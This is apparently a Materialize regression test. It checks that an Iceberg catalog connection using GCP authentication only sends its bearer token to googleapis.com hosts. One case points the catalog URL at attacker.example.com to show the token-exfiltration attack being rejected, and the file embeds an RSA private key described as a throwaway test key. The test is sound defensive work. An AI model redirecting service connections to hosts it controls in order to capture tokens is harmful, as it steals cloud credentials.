# Copyright Materialize, Inc. and contributors. All rights reserved.
#
# Use of this software is governed by the Business Source License
# included in the LICENSE file at the root of this repository.
#
# As of the Change Date specified in that file, in accordance with
# the Business Source License, use of this software will be governed
# by the Apache License, Version 2.0.

# Regression test for SS-69: an Iceberg REST catalog connection that
# authenticates with a GCP connection must only send its reusable, broadly-
# scoped bearer token to a Google-operated host. Without a plan-time host check,
# a principal with only USAGE on the GCP connection can aim the catalog URL at a
# host they control and exfiltrate the service-account token.

# Disable default validation so the accepted case below doesn't try to connect to the catalog
# (and fail because it's using a dummy private key).
# The catalog host check is enforced at plan time, independent of validation.
$ postgres-execute connection=postgres://mz_system:materialize@${testdrive.materialize-internal-sql-addr}
ALTER SYSTEM SET enable_default_connection_validation = false

# The private_key is a throwaway RSA key reused from the repo (src/ccsr/tests and
# the trufflehog allowlist) -- never a real credential. It must parse so gcp_auth
# reaches the token-fetch step that consumes token_uri. Backslashes are doubled:
# standard_conforming_strings is on, so the text->bytea cast turns each "\\n"
# into the literal "\n" the JSON needs.
$ set gcp-ssrf-key="-----BEGIN PRIVATE KEY-----\\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQDDC5MP3v1BHOgI\\n5SsmrW8mjxzQGOz0IlC5jp1muW/kpEoE9TG317TEnO5Uye6zZudkFCP8YGEiN3Mc\\nFbTM7eX6PjAPdnGU7khuUt/20ZM+NX5kWZPrmPTh4WQaDCL7ah1LqzBaUAMaSXq8\\niuy7LGJNF8wdx8L5BjDiGTTxZXOg0Haxknc7Mbiwc9z8eb7omvzQzsOwyqocrF2u\\nz86TzX1jtHP48i5CxoRHKxE94De3tNxjT/Y3OZlS4QS7iekAOQ04DVV3GIHvRUXN\\n2H8ayy4+yOdhHn6ER5Jn3lti1Q5XSrxkrYn7L1Vcj6IwZQhhF5vc+ovxOYb+8ert\\nEo97tIkLAgMBAAECggEAQteHHRPKz9Mzs8Sxvo4GPv0hnzFDl0DhUE4PJCKdtYoV\\n8dADq2DJiu3LAZS4cJPt7Y63bGitMRg2oyPPM8G9pD5Goy3wq9zjRqexKDlXUCTt\\n/T7zofRny7c94m1RWb7ablGq/vBXt90BqnajvVtvDsN+iKAqccQM4ZdI3QdrEmt1\\ncHex924itzG/mqbFTAfAmVj1ZsRnJp55Txy2gqq7jX00xDM8+H49SRvUu49N64LQ\\n6BUWCgWCJePRtgjSHjboAzPqSkMdaTE/WDY2zgGF3Qfq4f6JCHKfm4QylCH4gYUU\\n1Kf7ttmhu9NoZO+hczobKkxP9RtXfyTRH2bsJXy2HQKBgQDhHgavxk/ln5mdMGGw\\nrQud2vF9n7UwFiysYxocIC5/CWD0GAhnawchjPypbW/7vKM5Z9zhW3eH1U9P13sa\\n2xHfrU5BZ16rxoBbKNpcr7VeEbUBAsDoGV24xjoecp7rB2hZ+mGik5/5Ig1Rk1KH\\ndcvYy2KSi1h4Sm+mXwimmA4VDQKBgQDdzW+5FPbdM2sUB2gLMQtn3ICjDSu6IQ+k\\nd0p3WlTIT51RUsPXXKkk96O5anUbeB3syY8tSKPGggsaXaeL3o09yIamtERgCnn3\\nd9IS+4VKPWQlFUICU1KrD+TO7IYIX04iXBuVE5ihv0q3mslhDotmX4kS38NtKEFF\\njLjA2RvAdwKBgAFkIxxw+Ett+hALnX7vAtRd5wIku4TpjisejanA1Si50RyRDXQ+\\nKBQf/+u4HmoK12Nibe4Cl7GCMvRGW59l3S1pr8MdtWsQVfi6Puc1usQzDdBMyQ5m\\nIbsjlnZbtPm02QM9Vd8gVGvAtx5a77aglrrnPtuy+r/7jccUbURCSkv9AoGAH9m3\\nWGmVRZBzqO2jWDATxjdY1ZE3nUPQHjrvG5KCKD2ehqYO72cj9uYEwcRyyp4GFhGf\\nmM4cjo3wEDowrBoqSBv6kgfC5dO7TfkL1qP9sPp93gFeeD0E2wGuRrSaTqt46eA2\\nKcMloNx6W0FD98cB55KCeY5eXtdwAA/EHBVRMeMCgYAd3n6PcL6rVXyE3+wRTKK4\\n+zvx5sjTAnljr5ttbEnpZafzrYIfDpB8NNjexy83AeC0O13LvSHIFoTwP8sywJRO\\nRxbPMjhEBdVZ5NxlxYer7yKN+h5OBJfrLswPku7y4vdFYK3x/lMuNQO61hb1VFHc\\nT2BDTbF0QSlPxFsv18B9zg==\\n-----END PRIVATE KEY-----\\n"

> CREATE SECRET gcpsa AS '{"type":"service_account","project_id":"x","client_email":"a@b.com","private_key":"${gcp-ssrf-key}","token_uri":"https://oauth2.googleapis.com/token"}'

> CREATE CONNECTION gcpconn TO GCP (SERVICE ACCOUNT KEY = SECRET gcpsa)

# Exploit: a non-Google catalog host must be rejected before any token is sent.
! CREATE CONNECTION evil TO ICEBERG CATALOG (
    CATALOG TYPE = 'rest',
    URL = 'https://attacker.example.com/iceberg/v1/restcatalog',
    GCP CONNECTION = gcpconn,
    WAREHOUSE = 'gs://anything'
  )
contains:must point URL at a *.googleapis.com host

# Positive control: a real BigLake host is accepted, so the allowlist doesn't
# break the feature.
> CREATE CONNECTION biglake TO ICEBERG CATALOG (
    CATALOG TYPE = 'rest',
    URL = 'https://biglake.googleapis.com/iceberg/v1/restcatalog',
    GCP CONNECTION = gcpconn,
    WAREHOUSE = 'gs://anything'
  )
